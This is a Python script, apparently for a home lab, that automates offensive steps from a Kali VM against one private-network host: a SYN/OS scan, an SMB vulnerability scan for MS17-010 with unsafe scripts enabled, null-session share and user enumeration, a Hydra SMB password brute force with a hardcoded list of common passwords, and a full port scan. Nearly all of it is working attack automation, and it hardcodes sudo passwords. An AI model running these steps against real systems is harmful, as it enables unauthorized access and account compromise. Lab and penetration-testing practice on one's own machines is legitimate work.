#!/usr/bin/env python3
"""Step 2: Nmap with sudo + hydra brute force + full scan"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# Step 1: Nmap with sudo (using echo password)
print("=" * 60)
print("STEP 1: Nmap full scan (with sudo)")
print("=" * 60)
out = run_kali(f"echo kali | sudo -S nmap -sS -sV -O --top-ports 1000 -T4 192.168.233.129 2>&1", timeout=90)
print(out)

# Step 2: SMB vuln scan with sudo
print("\n" + "=" * 60)
print("STEP 2: SMB vulnerability scan (MS17-010)")
print("=" * 60)
out = run_kali(f"echo kali | sudo -S nmap -p 445,139 --script=smb-vuln* --script-args unsafe=1 192.168.233.129 2>&1", timeout=120)
print(out)

# Step 3: SMB null session + share enum
print("\n" + "=" * 60)
print("STEP 3: SMB null session + shares")
print("=" * 60)
out = run_kali(
    f"echo '=== SMBCLIENT ===' && smbclient -L //192.168.233.129/ -N 2>&1 && "
    f"echo '=== RPCCLIENT ===' && rpcclient -U '' -N 192.168.233.129 -c 'enumdomusers;querydominfo;netshareenumall' 2>&1 && "
    f"echo '=== SMBMAP ===' && smbmap -H 192.168.233.129 2>&1",
    timeout=30
)
print(out)

# Step 4: Hydra brute force
print("\n" + "=" * 60)
print("STEP 4: SMB brute force (hydra)")
print("=" * 60)
out = run_kali(
    "printf 'lkjm\\nadministrator\\nadmin\\nguest\\nuser\\ntest\\nsupport\\n' > /tmp/users.txt && "
    "printf '\\n123\\n1234\\n123456\\n12345678\\npassword\\nPassword1\\nadmin\\nadmin123\\n"
    "P@ssw0rd\\nqwerty\\nabc123\\nWelcome1\\nletmein\\nlkjm\\nlkjm123\\ntest\\ntest123\\n"
    "root\\nchangeme\\n000000\\n111111\\n666666\\n888888\\nWindows1\\nvmware\\n"
    "Aa123456\\n1qaz2wsx\\nq1w2e3r4\\nAdmin@123\\nP@ss1234\\nPassw0rd\\nadmin@123\\n"
    "123456789\\npassword1\\niloveyou\\ntrustno1\\nsunshine\\nmaster\\nshadow\\n' > /tmp/passes.txt && "
    "hydra -L /tmp/users.txt -P /tmp/passes.txt -t 32 -f smb://192.168.233.129 2>&1",
    timeout=180
)
print(out)

# Step 5: Full port scan
print("\n" + "=" * 60)
print("STEP 5: Full port scan (65535)")
print("=" * 60)
out = run_kali(f"echo kali | sudo -S nmap -sS -p- --min-rate 5000 -T4 192.168.233.129 2>&1", timeout=300)
print(out)

print("\n" + "=" * 60)
print("ALL SCANS DONE")
print("=" * 60)
